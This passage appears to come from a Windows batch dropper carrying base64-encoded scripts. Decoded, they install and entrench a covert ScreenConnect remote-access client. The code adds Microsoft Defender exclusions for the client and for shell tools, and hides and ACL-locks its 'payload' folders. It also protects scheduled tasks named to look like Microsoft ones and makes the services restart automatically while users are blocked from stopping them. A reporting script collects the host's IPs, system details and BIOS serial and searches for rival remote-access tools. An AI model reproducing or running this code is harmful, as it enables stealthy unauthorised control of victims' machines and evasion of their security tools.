MCB8IEZvckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBm
ODY9W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRw
Zjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5D
b25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVs
bE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1P
YmplY3QgLVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7
IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9y
ZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hl
bGwuZXhlJywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScs
J1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4
Y2x1c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJF
TSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAt
LS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0t
LSBoaWRlIHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVX
RCUiID5udWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRv
IE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92
ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZs
ZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4N
CmZvciAlJUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikg
ZG8gKA0KICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVs
ZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNl
cnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50
byBnYXJiYWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkg
aW5zdGVhZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9
J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICcl
V0QlXGlkZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2gg
J15UQVNLX1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0
YXJ0KCdcJykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnTWljcm9zb2Z0XFdpbmRvd3Nc
RGlhZ25vc2lzXFNjaGVkdWxlZCcsJ01pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdNaWNy
b3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdNaWNyb3NvZnRcV2luZG93c1xUY3Bp
cFxJcEFkZHJlc3NDb25mbGljdDEnKSB9OyIgXg0KICAiZm9yZWFjaCgkbiBpbiAkbmFtZXMpeyAk
ZiA9IEpvaW4tUGF0aCAnJVRBU0tST09UJScgJG47IGlmKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JGYpeyAmIGljYWNscy5leGUgJGYgL2luaGVyaXRhbmNlOnIgfCBPdXQtTnVsbDsgJiBpY2FjbHMu
ZXhlICRmIC9ncmFudDpyICdOVCBBVVRIT1JJVFlcU1lTVEVNOkYnICdCVUlMVElOXEFkbWluaXN0
cmF0b3JzOkYnIHwgT3V0LU51bGw7ICYgYXR0cmliLmV4ZSAraCArcyAkZiB8IE91dC1OdWxsIH0g
fSIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBXTUkgd2F0Y2hkb2cgc3Vic2NyaXB0aW9uIGZp
bGVzIChjaGFpbiAyKSAtLS0NCmljYWNscyAiJVN5c3RlbVJvb3QlXFN5c3RlbTMyXHdiZW1cUmVw
b3NpdG9yeSIgL2dyYW50ICJOVCBBVVRIT1JJVFlcU1lTVEVNOkYiID5udWwgMj4mMQ0KDQpSRU0g
LS0tIEFDTDoga2VlcCBTY3JlZW5Db25uZWN0IGluc3RhbGwgZGlycyAob25jZTsgdGFrZW93biBl
dmVyeSB0aWNrIGlzIG5vaXN5KSAtLS0NCmlmIG5vdCBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmb3IgJSVEIGluICgNCiAgICAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVAxJSkiDQogICAgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICAgICIl
UEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICIlUEY4NiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICApIGRvICgNCiAgICBpZiBleGlzdCAiJSV+RCIg
Y2FsbCA6TG9ja0RpciAiJSV+RCINCiAgKQ0KICBlY2hvIHNjX2xvY2tlZD4lV0QlXHNlY3VyZV9z
Yy5mbGFnDQopDQoNClJFTSAtLS0gU0Mgc2VydmljZXM6IFNZU1RFTSBjYW4gY29uZmlnL3N0b3Av
ZGVsZXRlOyBCQSBmdWxsOyB1c2VycyBibG9ja2VkIC0tLQ0KUkVNIFNZOiBDQyBEQyBMQyBTVyBS
UCBEVCBMTyBSQyAgKG5vIFNEIC0+IGNhbm5vdCBjaGFuZ2UgdGhpcyBTRCBpdHNlbGYpDQpzZXQg
IlNEPUQ6KEE7O0NDRENMQ1NXUlBXUERUTE9DUlJDOzs7U1kpKEE7O0NDRENMQ1NXUlBXUERUTE9D
UlNEUkNXRFdPOzs7QkEpIg0Kc2MuZXhlIHNkc2V0ICIlUFJJTSUiICIlU0QlIiA+bnVsIDI+JjEN
CnNjLmV4ZSBzZHNldCAiJUFMVCUiICIlU0QlIiA+bnVsIDI+JjENCnNjLmV4ZSBjb25maWcgIiVQ
UklNJSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlQUxUJSIgc3RhcnQ9
IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYx
DQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzYw
MDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCg0KZWNobyBzZWN1cmVf
ZG9uZT4+IiVMT0clIg0KZXhpdCAvYiAwDQoNCjpMb2NrRGlyDQpzZXQgIlQ9JX4xIg0KaWYgbm90
IGV4aXN0ICIlVCUiIGV4aXQgL2IgMA0KUkVNIHRha2Ugb3duZXJzaGlwIHRoZW4gc3RyaXAgaW5o
ZXJpdGVkIEFDRXM7IFNZU1RFTStBZG1pbnMgb25seQ0KdGFrZW93biAvRiAiJVQlIiAvUiAvRCBZ
ID5udWwgMj4mMQ0KaWNhY2xzICIlVCUiIC9pbmhlcml0YW5jZTpyID5udWwgMj4mMQ0KaWNhY2xz
ICIlVCUiIC9ncmFudDpyICJOVCBBVVRIT1JJVFlcU1lTVEVNOihPSSkoQ0kpRiIgIkJVSUxUSU5c
QWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGIiA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvcmVtb3Zl
OmcgIlVzZXJzIiAiQXV0aGVudGljYXRlZCBVc2VycyIgIkV2ZXJ5b25lIiAiTlQgQVVUSE9SSVRZ
XElOVEVSQUNUSVZFIiAiQlVJTFRJTlxVc2VycyIgPm51bCAyPiYxDQpleGl0IC9iIDANCg==
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4MDJUMTAgLSBp
ZGVudGl0eS1hd2FyZSB0YXNrcyArIGNvbXBhY3QgZGlnZXN0OyAtRm9yY2Ugb24gaGlkZGVuIGNh
Y2hlOyB3aWRlIG1hcmtlciBmaWx0ZXI7IHBheWxvYWQtYnVpbGQgdmlzaWJpbGl0eQ0KcGFyYW0o
DQogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kU3RhdGUsDQogICAg
W3N0cmluZ10kU3VtbWFyeSA9ICcnLA0KICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3Jh
bURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtzdHJpbmdd
JE9sZFN0YXRlID0gJycsDQogICAgW1ZhbGlkYXRlU2V0KCdyaWNoJywgJ2NvbXBhY3QnKV1bc3Ry
aW5nXSRNb2RlID0gJ3JpY2gnLA0KICAgIFtzdHJpbmddJEJ1aWxkID0gJ08xNScsDQogICAgW3N0
cmluZ10kQ291bnQgPSAnMCcNCikNCg0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRs
eUNvbnRpbnVlJw0KJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KdHJ5
IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2Vj
dXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9DQoNCmZ1bmN0aW9uIEdldC1DZmcg
ew0KICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnkuY2ZnJw0KICAgICRjZmcg
PSBAe30NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRwYXRoKSkgeyByZXR1cm4gJGNmZyB9DQog
ICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
ICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtBLVphLXowLTlfXSspXHMqPVxzKiguKilccyokJykg
ew0KICAgICAgICAgICAgJGNmZ1skbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXS5UcmltKCkNCiAg
ICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGNmZw0KfQ0KDQpmdW5jdGlvbiBFc2MoW3N0cmlu
Z10kcykgew0KICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0NCiAgICByZXR1cm4g
KCRzIC1yZXBsYWNlICcmJywgJyZhbXA7JyAtcmVwbGFjZSAnPCcsICcmbHQ7JyAtcmVwbGFjZSAn
PicsICcmZ3Q7JykNCn0NCg0KZnVuY3Rpb24gR2V0LVB1YmxpY0lwIHsNCiAgICBmb3JlYWNoICgk
dSBpbiBAKA0KICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsDQogICAgICAgICAg
ICAnaHR0cHM6Ly9pZmNvbmZpZy5tZS9pcCcsDQogICAgICAgICAgICAnaHR0cHM6Ly9pY2FuaGF6
aXAuY29tJw0KICAgICAgICApKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkciA9IElu
dm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHUgLVVzZUJhc2ljUGFyc2luZyAtVGltZW91dFNlYyA2DQog
ICAgICAgICAgICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQ0KICAgICAg
ICAgICAgaWYgKCRpcCAtbWF0Y2ggJ15cZHsxLDN9KFwuXGR7MSwzfSl7M30kJyAtb3IgJGlwIC1t
YXRjaCAnOicpIHsgcmV0dXJuICRpcCB9DQogICAgICAgIH0gY2F0Y2gge30NCiAgICB9DQogICAg
cmV0dXJuICduL2EnDQp9DQoNCmZ1bmN0aW9uIEdldC1Mb2NhbElwcyB7DQogICAgdHJ5IHsNCiAg
ICAgICAgJGlwcyA9IEdldC1OZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5J
UEFkZHJlc3MgLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfLlByZWZpeE9yaWdpbiAtbmUgJ1dlbGxL
bm93bicgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBJUEFk
ZHJlc3MgLVVuaXF1ZQ0KICAgICAgICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywg
JykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkaXBzID0gR2V0LUNpbUlu
c3RhbmNlIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJs
ZWQ9VHJ1ZScgfA0KICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyAkXy5JUEFkZHJlc3MgfSB8
IFdoZXJlLU9iamVjdCB7ICRfIC1hbmQgJF8gLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfIC1ub3Rs
aWtlICcqOionIH0NCiAgICAgICAgaWYgKCRpcHMpIHsgcmV0dXJuICgoJGlwcyB8IFNlbGVjdC1P
YmplY3QgLVVuaXF1ZSkgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4g
J24vYScNCn0NCg0KZnVuY3Rpb24gR2V0LU9zSW5mbyB7DQogICAgJG8gPSBbb3JkZXJlZF1Aew0K
ICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24gPSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsg
QXJjaCA9ICduL2EnDQogICAgICAgIERvbWFpbiA9ICduL2EnOyBJbnN0YWxsRGF0ZSA9ICduL2En
OyBMYXN0Qm9vdCA9ICduL2EnDQogICAgICAgIENQVSA9ICduL2EnOyBNYW51ZmFjdHVyZXIgPSAn
bi9hJzsgTW9kZWwgPSAnbi9hJzsgU2VyaWFsID0gJ24vYScNCiAgICAgICAgVG90YWxSQU1fR0Ig
PSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1NpemVfR0IgPSAnbi9hJw0KICAgIH0N
CiAgICB0cnkgew0KICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5n
U3lzdGVtDQogICAgICAgICRvLkNhcHRpb24gPSAkb3MuQ2FwdGlvbg0KICAgICAgICAkby5WZXJz
aW9uID0gJG9zLlZlcnNpb24NCiAgICAgICAgJG8uQnVpbGQgPSAkb3MuQnVpbGROdW1iZXINCiAg
ICAgICAgJG8uQXJjaCA9ICRvcy5PU0FyY2hpdGVjdHVyZQ0KICAgICAgICAkby5JbnN0YWxsRGF0
ZSA9ICgkb3MuSW5zdGFsbERhdGUgfCBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkJykNCiAg
ICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0LURhdGUgLUZvcm1h
dCAneXl5eS1NTS1kZCBISDptbScpDQogICAgICAgICRvLlRvdGFsUkFNX0dCID0gW21hdGhdOjpS
b3VuZCgkb3MuVG90YWxWaXNpYmxlTWVtb3J5U2l6ZSAvIDFNQiwgMSkNCiAgICB9IGNhdGNoIHt9
DQogICAgdHJ5IHsNCiAgICAgICAgJGNzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0NvbXB1dGVy
U3lzdGVtDQogICAgICAgICRvLkRvbWFpbiA9IGlmICgkY3MuUGFydE9mRG9tYWluKSB7ICRjcy5E
b21haW4gfSBlbHNlIHsgJGNzLldvcmtncm91cCB9DQogICAgICAgICRvLk1hbnVmYWN0dXJlciA9
ICRjcy5NYW51ZmFjdHVyZXINCiAgICAgICAgJG8uTW9kZWwgPSAkY3MuTW9kZWwNCiAgICB9IGNh
dGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJG8uQ1BVID0gKEdldC1DaW1JbnN0YW5jZSBXaW4z
Ml9Qcm9jZXNzb3IgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxIC1FeHBhbmRQcm9wZXJ0eSBOYW1l
KQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5TZXJpYWwgPSAoR2V0LUNp
bUluc3RhbmNlIFdpbjMyX0JJT1MpLlNlcmlhbE51bWJlcg0KICAgIH0gY2F0Y2gge30NCiAgICB0
cnkgew0KICAgICAgICAkZCA9IEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Mb2dpY2FsRGlzayAtRmls
dGVyICJEZXZpY2VJRD0nQzonIg0KICAgICAgICAkby5EaXNrRnJlZV9HQiA9IFttYXRoXTo6Um91
bmQoJGQuRnJlZVNwYWNlIC8gMUdCLCAxKQ0KICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRo
XTo6Um91bmQoJGQuU2l6ZSAvIDFHQiwgMSkNCiAgICB9IGNhdGNoIHt9DQogICAgcmV0dXJuICRv
DQp9DQoNCmZ1bmN0aW9uIEdldC1TdmNMaW5lKFtzdHJpbmddJG5hbWUpIHsNCiAgICAkcyA9IEdl
dC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
aWYgKC1ub3QgJHMpIHsgcmV0dXJuICdOT1QgSU5TVEFMTEVEJyB9DQogICAgcmV0dXJuICgnezB9
IChTdGFydD17MX0pJyAtZiAkcy5TdGF0dXMsICRzLlN0YXJ0VHlwZSkNCn0NCg0KZnVuY3Rpb24g
R2V0LVRhc2tIZWFsdGgoW3N0cmluZ10kdG4pIHsNCiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUg
L1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFTVEVYSVRDT0RF
IC1uZSAwIC1vciAtbm90ICRvdXQpIHsNCiAgICAgICAgcmV0dXJuIEB7IFByZXNlbnQgPSAkZmFs
c2U7IFN0YXR1cyA9ICdNSVNTSU5HJzsgTmV4dCA9ICcnOyBMYXN0ID0gJyc7IFJlc3VsdCA9ICcn
IH0NCiAgICB9DQogICAgJG1hcCA9IEB7fQ0KICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsN
CiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbXjpdKyk6XHMqKC4qKVxzKiQnKSB7DQog
ICAgICAgICAgICAkbWFwWyRtYXRjaGVzWzFdLlRyaW0oKV0gPSAkbWF0Y2hlc1syXS5UcmltKCkN
CiAgICAgICAgfQ0KICAgIH0NCiAgICAkc3RhdHVzID0gJG1hcFsnU3RhdHVzJ10NCiAgICBpZiAo
LW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0NCiAgICBpZiAo
LW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAncHJlc2VudCcgfQ0KICAgICRuZXh0ID0gJG1hcFsn
TmV4dCBSdW4gVGltZSddDQogICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9DQogICAg
JGxhc3QgPSAkbWFwWydMYXN0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbGFzdCkgeyAkbGFz
dCA9ICcnIH0NCiAgICAkcmVzdWx0ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQ0KICAgIGlmICgtbm90
ICRyZXN1bHQpIHsgJHJlc3VsdCA9ICcnIH0NCiAgICAkaGVhbHRoeSA9ICgkc3RhdHVzIC1tYXRj
aCAnUmVhZHl8UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKQ0KICAgIHJldHVy
biBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgSGVhbHRoeSA9IFtib29sXSRo
ZWFsdGh5DQogICAgICAgIFN0YXR1cyAgPSAkc3RhdHVzDQogICAgICAgIE5leHQgICAgPSAkbmV4
dA0KICAgICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQNCiAg
ICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAkdG9rZW5zID0gQCgNCiAgICAg
ICAgJ0FueURlc2snLCAnVGVhbVZpZXdlcicsICd0dm5zZXJ2ZXInLCAnRFdBZ2VudCcsICdEV1Nl
cnZpY2UnLCAnTG9nTWVJbicsICdMTUlHdWFyZGlhbicsDQogICAgICAgICdXaW5WTkMnLCAndm5j
c2VydmVyJywgJ3R2XycsICdTcGxhc2h0b3AnLCAnWm9obycsICdSdXN0RGVzaycsICdSZW1vdGVQ
QycsICdEYW1lV2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1N
JywgJ05pbmphT25lJywgJ05pbmphJywgJ0thc2V5YScsICdQdWxzZXdheScsICdTeW5jcm8nLA0K
ICAgICAgICAnU3VwZXJPcHMnLCAnTWFuYWdlRW5naW5lJywgJ1NvbGFyV2luZHMnLCAnQ29ubmVj
dFdpc2UnLCAnTFRTZXJ2aWNlJywgJ0xhYlRlY2gnLA0KICAgICAgICAnQWN0aW9uMScsICdTaW1w
bGVIZWxwJywgJ0JvbWdhcicsICdCZXlvbmRUcnVzdCcsICdNZXNoQWdlbnQnLCAnTWVzaCBDZW50
cmFsJywNCiAgICAgICAgJ1RhY3RpY2FsUk1NJywgJ3RhY3RpY2Fscm1tJywgICAgICAgICAnR2V0
U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywNCiAgICAgICAg
J0Nocm9tZSBSZW1vdGUgRGVza3RvcCcsICdQYXJzZWMnLCAnTmV0U3VwcG9ydCcsICdMZXZlbC5p
bycsICdMZXZlbCBBZ2VudCcsDQogICAgICAgICdEYXR0byBSTU0nLCAnQ29udGludXVtJw0KICAg
ICkNCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlz
dFtzdHJpbmddDQogICAgJHNlZW4gPSBAe30NCg0KICAgIGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmlu
Z10ka2luZCwgW3N0cmluZ10kbmFtZSkgew0KICAgICAgICAka2V5ID0gIiRraW5kfCRuYW1lIi5U
b0xvd2VySW52YXJpYW50KCkNCiAgICAgICAgaWYgKCRzZWVuLkNvbnRhaW5zS2V5KCRrZXkpKSB7
IHJldHVybiB9DQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUNCiAgICAgICAgW3ZvaWRdJGhp
dHMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+JyAtZiAka2luZCwgKEVzYyAkbmFtZSkp
KQ0KICAgIH0NCg0KICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkbiA9ICRfLk5hbWUNCiAgICAgICAgJGQgPSAk
Xy5EaXNwbGF5TmFtZQ0KICAgICAgICBpZiAoJG4gLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50
KicpIHsgcmV0dXJuIH0NCiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2Vucykgew0KICAgICAg
ICAgICAgaWYgKCRuIC1saWtlICIqJHQqIiAtb3IgJGQgLWxpa2UgIiokdCoiKSB7DQogICAgICAg
ICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAg
ICAgICBicmVhaw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgR2V0LVBy
b2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
ICAgICAgICRuID0gJF8uUHJvY2Vzc05hbWUNCiAgICAgICAgaWYgKCRuIC1saWtlICcqU2NyZWVu
Q29ubmVjdConKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsN
CiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAgICAgICAgICAgICBBZGQt
SGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQogICAg
ICAgIH0NCiAgICB9DQoNCiAgICAkdW5pbnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJF
XE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAg
J0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJz
aW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBpbiAkdW5pbnN0KSB7
DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZG4gPSBbc3RyaW5nXSRfLkRp
c3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0dXJuIH0NCiAgICAgICAg
ICAgIGlmICgkZG4gLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuIH0NCiAgICAgICAg
ICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1s
aWtlICIqJHQqIikgew0KICAgICAgICAgICAgICAgICAgICBBZGQtSGl0ICdtc2knICRkbg0KICAg
ICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0N
CiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiAkaGl0cw0KfQ0KDQpmdW5jdGlvbiBHZXQt
U2NJbnN0YWxscyB7DQogICAgJGxpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5H
ZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdCBD
bGllbnQqJyB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkZnAgPSBpZiAoJF8uTmFtZSAt
bWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBlbHNlIHsgJz8nIH0N
CiAgICAgICAgJHRhZyA9IGlmICgkZnAgLWVxICc1ZjYwMTA1Nzk4NTJlNTA3JykgeyAnS0VFUC1Q
